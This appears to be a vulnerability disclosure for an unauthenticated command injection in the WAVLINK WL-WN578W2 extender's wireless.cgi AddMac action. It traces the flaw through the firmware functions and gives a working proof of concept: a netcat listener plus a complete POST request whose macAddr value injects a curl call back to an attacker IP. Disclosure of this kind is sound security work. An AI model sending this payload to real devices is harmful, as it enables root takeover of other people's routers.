\# WAVLINK WL-WN578W2 M78W2\\\_V221110 Unauthenticated Command Injection (wireless.cgi AddMac)



PS:







1\.  Use physical WAVLINK WL-WN578W2 for testing (QEMU simulation is difficult).



2\.  \*\*No authentication required\*\*: No cookie or login credentials needed—vulnerability exploitable directly.



\## Overview



An unauthenticated command injection vulnerability exists in the `AddMac` action of `/cgi-bin/wireless.cgi` (WAVLINK WL-WN578W2, firmware M78W2\\\_V221110). The `macAddr` parameter is unsanitized and directly concatenated into system commands. Attackers can send POST requests with `page=AddMac` and inject arbitrary commands via `macAddr`—no login required—to execute `root`-level operations.







!\[Vulnerability Flow: Unauthenticated Injection](./imgs/1.png)



\## Details







\*   \*\*Vendor\*\*: WAVLINK



\*   \*\*Product\*\*: WL-WN578W2 (wireless range extender)



\*   \*\*Firmware\*\*: M78W2\\\_V221110



\*   \*\*Endpoint\*\*: `/cgi-bin/wireless.cgi` (POST, `page=AddMac`)



\*   \*\*Vulnerable Parameter\*\*: `macAddr`



\*   \*\*Type\*\*: Unauthenticated Command Injection



\*   \*\*Impact\*\*: Execute arbitrary `root` commands (exfiltrate data, plant backdoors) without credentials



\*   \*\*Reported by\*\*: n0ps1ed (n0ps1edzz@gmail.com)

\### Description







1\.  \*\*No Effective Auth Check\*\*: The `ftext` function’s authentication logic (via `sub\_404DBC()`) is ineffective, allowing unauthenticated requests to proceed.



2\.  \*\*Action Routing\*\*: When `page=AddMac` is parsed, the `sub\_4030F8` function is called to process the request.



3\.  \*\*Unsanitized Injection\*\*: `macAddr` is extracted and directly concatenated into the command `addmac %s` via `sprintf`, with no filtering of separators (e.g., `;`). This allows unauthenticated attackers to inject arbitrary commands.







!\[Vulnerability Code Snippet](./imgs/2.png)

!\[Vulnerability Code Snippet](./imgs/3.png)



\## Proof of Concept (PoC)



\### PoC: Inject `curl` via `macAddr`



No login or cookie needed.



\#### 1. Start Netcat Listener



On attacker machine (IP: 192.168.10.154):







```

nc -lvnp 1234

```







!\[Netcat Listener](./imgs/8.png)



\#### 2. Send Unauthenticated POST Request







```

POST /cgi-bin/wireless.cgi HTTP/1.1



Host: wifi.wavlink.com



Cache-Control: max-age=0



Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"



Sec-Ch-Ua-Mobile: ?0



Sec-Ch-Ua-Platform: "Linux"



Accept-Language: en-US,en;q=0.9



Upgrade-Insecure-Requests: 1



User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36



Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\\\*/\\\*;q=0.8,application/signed-exchange;v=b3;q=0.7



Sec-Fetch-Site: none



Sec-Fetch-Mode: navigate



Sec-Fetch-User: ?1



Sec-Fetch-Dest: document



Accept-Encoding: gzip, deflate, br



Priority: u=0, i



Connection: keep-alive



Content-Length: 48



page=AddMac\\\&addMac=\\\&addName=\\\&macAddr=;curl http://192.168.10.154:1234

```



\#### 3. Verify Execution



Netcat receives request from device, confirming command injection success:







!\[Injection Result](./imgs/4.png)



